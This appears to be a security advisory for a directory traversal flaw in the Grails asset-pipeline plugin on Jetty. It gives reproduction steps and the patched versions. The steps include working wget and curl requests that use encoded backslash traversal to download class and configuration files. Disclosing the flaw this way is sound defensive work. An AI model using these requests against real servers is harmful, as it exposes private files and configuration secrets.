## Introduction

[Asset-pipeline](https://plugins.grails.org/plugin/grails/asset-pipeline) has been the default plugin for handling static assets in a Grails<sup>&reg;</sup> web application since Grails 2.4.0\. A security vulnerability that involves asset-pipeline and Jetty has been identified.

## Affected Versions

The vulnerability affects all asset-pipeline users that deploy Grails applications in Jetty, and it allows directory traversal and download any file knowing its specific directory.

## Reproducing The Issue

*   Create a new grails application: `grails create-app foo`
*   In `build.gradle` change the `spring-boot-starter-tomcat` to `spring-boot-starter-jetty`
*   Build a war file: `grails war`
*   Deploy to Jetty
*   Send the following request to download Application.class `wget localhost:8080/foo-0.1/assets/..%5c%5cfoo%5cApplication.class -O Application.class`
*   It is also possible to download any any arbitrary file if the path is known. For example to download `application.yml`execute `curl -v localhost:8080/foo-0.1/assets/..%5capplication.yml`.

## Fixing The Issue

The vulnerability has been addressed in recent versions of the asset-pipeline plugin:

*   2.14.1.1 for Grails 2.x
*   2.15.1 for Grails 3 and Java 7
*   3.0.6 for Grails 3 and Java 8
